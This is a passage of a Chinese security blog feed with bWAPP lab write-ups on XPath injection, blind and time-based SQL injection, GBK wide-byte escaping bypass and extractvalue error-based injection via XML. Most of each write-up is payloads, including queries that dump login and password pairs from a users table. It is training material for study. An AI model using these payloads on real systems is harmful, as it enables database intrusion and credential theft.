<td>选取所有带有属性的 title 元素</td>
</tr>
</tbody></table>
<h4 id="选取多个路径"><a href="#选取多个路径" class="headerlink" title="选取多个路径"></a>选取多个路径</h4><table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>//book/title | //book/price</td>
<td>选取 book 元素的所有 title 和 price 元素</td>
</tr>
<tr>
<td>bookstore/book/title | //price</td>
<td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素</td>
</tr>
</tbody></table>
<h4 id="xpath函数"><a href="#xpath函数" class="headerlink" title="xpath函数"></a>xpath函数</h4><p><a href="https://www.runoob.com/xpath/xpath-functions.html" target="_blank" rel="noopener">XPath函数</a></p>
<h2 id="xpath注入原理"><a href="#xpath注入原理" class="headerlink" title="xpath注入原理"></a>xpath注入原理</h2><p>xpath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，<strong>通过执行XPath查询而执行入侵者想要的操作，但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件</strong>。攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML 数据被用于用户认证，那么攻击者就可以提升他的权限。因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML 中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个 XML 文档。<strong>注入出现的位置也就是cookie，headers，request parameters/input等</strong></p>
<p><a href="https://blog.csdn.net/quiet_girl/article/details/50588130" target="_blank" rel="noopener">XPath注入攻击</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">xpath注入详解</a></p>
<h1 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h1><h2 id="XPath-Injection-Login-Form"><a href="#XPath-Injection-Login-Form" class="headerlink" title="XPath Injection (Login Form)"></a>XPath Injection (Login Form)</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"login"</span>]) &amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">"password"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $login = $_REQUEST[<span class="string">"login"</span>];</span><br><span class="line">    $login = xmli($login);</span><br><span class="line">    $password = $_REQUEST[<span class="string">"password"</span>];</span><br><span class="line">    $password = xmli($password);</span><br><span class="line">    <span class="comment">// Loads the XML file</span></span><br><span class="line">    $xml = simplexml_load_file(<span class="string">"passwords/heroes.xml"</span>);</span><br><span class="line">    <span class="comment">// XPath search</span></span><br><span class="line">    $result = $xml-&gt;xpath(<span class="string">"/heroes/hero[login='"</span> . $login . <span class="string">"' and password='"</span> . $password . <span class="string">"']"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故只需对·<code>/heroes/hero[login=&#39;&quot; . $login . &quot;&#39; and password=&#39;&quot; . $password . &quot;&#39;]</code>进行适当闭合即可</p>
<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">' or 1=1 or '</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">// /heroes/hero[login='' or 1=1 or '' and password='a']</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/23/bWAPP-XPathInjection/image-20200925224234017.png" alt="image-20200925224234017"></p>
<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>对 <code>( ) = &#39; [ ] : , * / WHITESPACE</code>危险字符进行过滤，无法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xmli_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replaces dangerous characters: ( ) = ' [ ] : , * / WHITESPACE</span></span><br><span class="line">    $input = str_replace(<span class="string">"("</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">")"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"="</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"["</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"]"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">":"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">","</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"*"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"/"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">" "</span>, <span class="string">""</span>, $input);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="XPath-Injection-Search"><a href="#XPath-Injection-Search" class="headerlink" title="XPath Injection (Search)"></a>XPath Injection (Search)</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = $xml-&gt;xpath(<span class="string">"//hero[contains(genre, '$genre')]/movie"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">action')] | //* | //*[('&amp;action=search</span><br><span class="line"></span><br><span class="line">//  /hero[contains(genre, 'action')] | //* | //*[('')]/movie"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/23/bWAPP-XPathInjection/image-20200925225823929.png" alt="image-20200925225823929"></p>
<h3 id="mid-high-1"><a href="#mid-high-1" class="headerlink" title="mid/high"></a>mid/high</h3><p>对 <code>( ) = &#39; [ ] : , * / WHITESPACE</code>危险字符进行过滤，无法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xmli_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replaces dangerous characters: ( ) = ' [ ] : , * / WHITESPACE</span></span><br><span class="line">    $input = str_replace(<span class="string">"("</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">")"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"="</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"["</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"]"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">":"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">","</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"*"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"/"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">" "</span>, <span class="string">""</span>, $input);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="XPath-工具"><a href="#XPath-工具" class="headerlink" title="XPath 工具"></a>XPath 工具</h1><p><a href="https://getfirebug.com/" target="_blank" rel="noopener">Firebug</a></p>
<p><a href="https://github.com/orf/xcat" target="_blank" rel="noopener">xcat</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLIBlind2</title>
    <url>/2020/09/23/bWAPP-SQLIBlind2/</url>
    <content><![CDATA[<h1 id="时间延迟注入"><a href="#时间延迟注入" class="headerlink" title="时间延迟注入"></a>时间延迟注入</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h2 id="1-判断存在注入"><a href="#1-判断存在注入" class="headerlink" title="1.判断存在注入"></a>1.判断存在注入</h2>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(3) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--' or sleep(if((1=2), true, false))#</span></span><br><span class="line">' or sleep(if((1=2), 0, 3)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>  <img src="/2020/09/23/bWAPP-SQLIBlind2/image-20200923204841437.png" alt="image-20200923204841437"></p>
<p><img src="/2020/09/23/bWAPP-SQLIBlind2/image-20200923205138207.png" alt="image-20200923205138207"></p>
<h2 id="2-判断数据库长度并逐个爆破-sleep-length"><a href="#2-判断数据库长度并逐个爆破-sleep-length" class="headerlink" title="2.判断数据库长度并逐个爆破(sleep/length)"></a>2.判断数据库长度并逐个爆破(sleep/length)</h2>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if(length(database())&gt;7 , 1, 3)) # --(false)</span><br><span class="line"></span><br><span class="line">' or sleep(if(length(database())&gt;3 , 1, 3)) # --(true)</span><br><span class="line"><span class="comment">--则数据库长度在(3,7)之间</span></span><br></pre></td></tr></table></figure>

<h2 id="3-爆破表的个数-长度-表名-count-length-mid"><a href="#3-爆破表的个数-长度-表名-count-length-mid" class="headerlink" title="3.爆破表的个数/长度/表名(count/length/mid)"></a>3.爆破表的个数/长度/表名(count/length/mid)</h2><ul>
<li><p>表个数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if( ((<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span>) , <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#  --(false)</span></span><br><span class="line"></span><br><span class="line"><span class="string">' or sleep(if( ((select count(table_name) from information_schema.tables where table_schema=database())&gt;3) , 1, 3)) # --(true)</span></span><br><span class="line"><span class="string">--则表个数在(3,5)之间</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>表长度</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if((length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span>), <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if((ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">100</span>), <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="4-爆破列个数-长度-列名-count-length-mid"><a href="#4-爆破列个数-长度-列名-count-length-mid" class="headerlink" title="4.爆破列个数/长度/列名(count/length/mid)"></a>4.爆破列个数/长度/列名(count/length/mid)</h2><ul>
<li>列个数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if( ((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span>) , <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>列长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if((length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span>), <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or sleep(if((ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">105</span> ), <span class="number">1</span>, <span class="number">3</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLiBlind</title>
    <url>/2020/09/22/bWAPP-SQLiBlind/</url>
    <content><![CDATA[<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'</span><br><span class="line">' or 1=1<span class="comment">#</span></span><br><span class="line">' or 1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204246265.png" alt="image-20200922204246265"></p>
<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204329452.png" alt="image-20200922204329452"></p>
<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204338283.png" alt="image-20200922204338283"></p>
<h3 id="2-判断数据库长度并逐个爆破-count-length-mid"><a href="#2-判断数据库长度并逐个爆破-count-length-mid" class="headerlink" title="2.判断数据库长度并逐个爆破(count/length/mid)"></a>2.判断数据库长度并逐个爆破(count/length/mid)</h3><ul>
<li>使用length()函数判断数据库长度（二分法）</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 前面放回false 执行or 后面的语句如果返回true则数据库长度大于该值，反之小于</span></span><br><span class="line">' or length(database()) &gt;  8#</span><br><span class="line">' or length(database()) &gt;  4#</span><br><span class="line">' or length(database()) &gt;  6#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204457549.png" alt="image-20200922204457549"></p>
<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204522341.png" alt="image-20200922204522341"></p>
<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204636118.png" alt="image-20200922204636118"></p>
<p>故数据库长度为5</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length(database()) =  5<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204814865.png" alt="image-20200922204814865"></p>
<ul>
<li><p>逐个字符爆破数据库名</p>
<p>使用<code>mid</code>或<code>substring</code>截取字符并逐个判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--' or ascii(mid(database(),1,1))&gt;110 #</span></span><br><span class="line">' or ascii(substring(database(),1,1))&gt;100 # （false）</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;95 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;97 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;99 # (flase)</span><br><span class="line">' or ascii(substring(database(),1,1))= 98 <span class="comment"># (true)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205443795.png" alt="image-20200922205443795"></p>
<p>98对应为字符 b </p>
<p><a href="https://tool.ip138.com/ascii_code/" target="_blank" rel="noopener">ascii码对照</a></p>
<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205754286.png" alt="image-20200922205754286"></p>
<p>以此类推得到表名</p>
</li>
</ul>
<h3 id="爆破表的个数-长度-表名-count-length-mid"><a href="#爆破表的个数-长度-表名-count-length-mid" class="headerlink" title="爆破表的个数/长度/表名(count/length/mid)"></a>爆破表的个数/长度/表名(count/length/mid)</h3><ul>
<li>爆破表的个数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’ or (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>爆破表的长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>爆破字符</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">100</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="爆破列个数-长度-列名-count-length-mid"><a href="#爆破列个数-长度-列名-count-length-mid" class="headerlink" title="爆破列个数/长度/列名(count/length/mid)"></a>爆破列个数/长度/列名(count/length/mid)</h3><ul>
<li>爆破列的个数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span>) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>爆破列的长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>爆破列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">105</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>直接注入，可使用sqlmap进行注入</p>
<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>采用了addslashed()和mysqli_real_escape_string()函数, </p>
<p>且mysql编码和os编码一致, 无法用宽字节绕过,</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>注入原理很简单, 就是编码, 一点一点分析:</p>
<p>假设一个url有注入, 但是有安全函数, 我们敲单引号会被过滤，那么怎么办呢？这时候就利用GBK双字节注入</p>
<p>我们在后边这么构造url一个尝试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.****.com&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>其中,</p>
<p><strong>%df ‘ 经过安全函数之后在 ‘ 之前会被加上一个转义符号’&#39;, 即: %df &#39;</strong></p>
<p>由于采用的是url编码, 最后转化为:</p>
<p><strong>%df%5c%27</strong></p>
<p>关键就在这，%df会吃掉%5c，形成一个新的字节, 形象一点就是%df遇到%5c会把%5c吃掉，形成%df%5c，这个编码经过代码</p>
<p>解码后会形成一个汉字“誠”</p>
<p>还不明白? 没关系, 举一个简单的栗子:</p>
<p>xi’an (西安) ==&gt; xian(先) </p>
<p>值得一提的是, 并不是唯一的使用%df, <strong>只要编码超过ascii码(128)之后, 可以自己组合。只要是汉字就都可以使用</strong></p>
<p><strong>总的来解释一下,</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为%df的关系，\的编码%5c被吃掉了，也就失去了转义的效果，即安全函数丧失了作用, 被直接带入到mysql中，然后mysql在解读时无视了%df%5c形成的新字节，那么单引号便重新发挥了效果, 就可以构造注入了。</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/angry_program/article/details/103860262" target="_blank" rel="noopener">宽字节注入</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLiXML</title>
    <url>/2020/09/22/bWAPP-SQLiXML/</url>
    <content><![CDATA[<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli8-1.php 点击按钮之后调用javascript,跳转到sqli8-2.php</span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ResetSecret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> xmlHttp;</span><br><span class="line">            <span class="comment">// Code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Code for IE6, IE5</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            xmlHttp.open(<span class="string">"POST"</span>,<span class="string">"sqli_8-2.php"</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlHttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"text/xml; charset=UTF-8"</span>);</span><br><span class="line">            xmlHttp.send(<span class="string">"&lt;reset&gt;&lt;login&gt;&lt;?php if(isset($_SESSION["</span>login<span class="string">"]))&#123;echo $_SESSION["</span>login<span class="string">"];&#125;?&gt;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli8-2.php 接收传递过来的数据</span></span><br><span class="line"><span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"1"</span> &amp;&amp; $_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"2"</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ini_set(<span class="string">"display_errors"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($body);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debugging</span></span><br><span class="line">    <span class="comment">// print_r($xml);</span></span><br><span class="line"></span><br><span class="line">    $login = $xml-&gt;login;</span><br><span class="line">    $secret = $xml-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($login &amp;&amp; $login != <span class="string">""</span> &amp;&amp; $secret)</span><br><span class="line">    &#123;</span><br><span class="line">		</span><br><span class="line">        $sql = <span class="string">"UPDATE users SET secret = '"</span> . $secret . <span class="string">"' WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">        <span class="comment">//可对查询语句进行注入，闭合 '</span></span><br><span class="line">        <span class="comment">// Debugging</span></span><br><span class="line">        <span class="comment">// echo $sql;      </span></span><br><span class="line">        $recordset = $link-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$recordset)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Connect Error: "</span> . $link-&gt;error);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $message = $login . <span class="string">"'s secret has been reset!"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><ul>
<li>爆库</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193435147.png" alt="image-20200922193435147"></p>
<ul>
<li>爆表</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193717938.png" alt="image-20200922193717938"></p>
<ul>
<li><p>爆列</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922194134054.png" alt="image-20200922194134054"></p>
</li>
<li><p>获取信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,(select group_concat(login,'-',password) from users ))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202027015.png" alt="image-20200922202027015"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,substring((select group_concat(login,'-',password) from users),49,81))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202017200.png" alt="image-20200922202017200"></p>
</li>
</ul>
<h1 id="extractvalue-用法"><a href="#extractvalue-用法" class="headerlink" title="extractvalue()用法"></a>extractvalue()用法</h1><p>mysql 5.1以后推出了xml的解析支持</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> extractValue(<span class="string">'&lt;a href="sss"&gt;&lt;/a&gt;&lt;a href="2333"&gt;&lt;/a&gt;'</span>,<span class="string">'/a/attribute::href'</span>) <span class="keyword">body</span> <span class="keyword">FROM</span> <span class="string">`casexml`</span></span><br></pre></td></tr></table></figure>

